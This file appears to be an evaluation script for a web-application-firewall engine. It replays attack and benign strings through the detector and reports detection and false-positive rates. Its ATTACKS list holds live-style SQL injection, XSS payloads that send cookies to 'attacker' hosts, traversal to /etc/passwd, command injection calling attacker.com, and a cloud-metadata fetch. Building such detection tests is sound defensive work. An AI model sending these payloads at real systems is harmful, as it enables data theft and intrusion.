"""Replay real-world attack payloads and benign traffic through the engine.

The payloads here are representative of what sqlmap, dalfox, nikto and manual
testing emit, and are deliberately phrased differently from the training seeds
so this is a generalization check, not a memorization check. It runs the full
engine decision (features + ensemble + thresholds) at enforce thresholds and
reports detection rate and false-positive rate.

Run inside the engine image:
  docker run --rm --entrypoint python sentinel-sidecar/engine:dev -m eval_replay
(the file is mounted at /app/eval_replay.py)
"""

from __future__ import annotations

from sentinel_engine import ensemble, features
from sentinel_engine.scorers import Context, default_scorers

ATTACKS = [
    # sqlmap-style
    "1 AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(0x7176,version(),0x71)x FROM information_schema.tables GROUP BY x)a)",
    "1) AND 4523=CAST((CHR(113)||CHR(118))||(SELECT version()) AS NUMERIC)-- -",
    "id=1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))-- -",
    "1 UNION ALL SELECT NULL,CONCAT(0x716a7871,user(),0x717a7a71),NULL-- -",
    "1 WAITFOR DELAY '0:0:5'--",
    "%27%20AND%201%3D1%20UNION%20SELECT%20password%20FROM%20users--",
    # dalfox / XSS
    "\"><svg onload=alert(document.domain)>",
    "'\"><img src=x onerror=this.src='//dalfox/'+document.cookie>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<script>new Image().src='//attacker/c='+document.cookie</script>",
    # traversal / LFI
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%afboot.ini",
    # command injection
    ";cat${IFS}/etc/passwd",
    "$(nslookup attacker.com)",
    "|| curl http://169.254.169.254/latest/meta-data/",
    # SSTI
    "{{().__class__.__bases__[0].__subclasses__()}}",
    "${{<%[%'\"}}%\\\\.",
]

BENIGN = [
    "wireless noise cancelling headphones", "john.smith+news@example.co.uk", "order status for #A1029384",
    "https://shop.example.com/catalog?category=books&sort=price", "2024-11-05T14:30:00Z",
    "The meeting is rescheduled to next Tuesday at 10am.", "résumé for senior engineer position",
    "SELECT the delivery option that suits you", "price range $50-$150", "SKU-99213-XL",
    "c:\\\\Users\\\\Public\\\\Documents", "path/to/my/photo album/beach.jpg", "1234567890",
    "user preferences and settings", "how do I reset my password", "drop me a line anytime",
    "a && b comparison in logic class", "math: (3+4)*2 = 14", "café ☕ downtown", "SsangYong Korando review",
]

DEFAULT_POLICY = {
    "thresholds": {"log": 0.4, "challenge": 0.7, "block": 0.85},
    "models": {"m1": 0.4, "m2": 0.2, "m3": 0.2, "m4": 0.0, "crs": 0.2},
}


def _decide(value: str) -> str:
    f = features.extract("GET", "/x?q=" + value, {}, b"")
    c = Context(features=f)
    return ensemble.combine(c, SCORERS, DEFAULT_POLICY, "enforce").effective


SCORERS = default_scorers()


def main():
    print(f"scorer: {type(SCORERS[0]).__name__}")
    blocked = sum(1 for a in ATTACKS if _decide(a) in ("block", "challenge"))
    fp = sum(1 for b in BENIGN if _decide(b) in ("block", "challenge"))
    det = blocked / len(ATTACKS)
    fpr = fp / len(BENIGN)
    print(f"attacks blocked/challenged: {blocked}/{len(ATTACKS)}  detection={det*100:.1f}%")
    print(f"benign blocked (false positives): {fp}/{len(BENIGN)}  FPR={fpr*100:.1f}%")
    print("\nmissed attacks:")
    for a in ATTACKS:
        if _decide(a) not in ("block", "challenge"):
            print("  MISS:", a[:70])
    print("\nfalse positives:")
    for b in BENIGN:
        if _decide(b) in ("block", "challenge"):
            print("  FP:", b[:70])


if __name__ == "__main__":
    main()
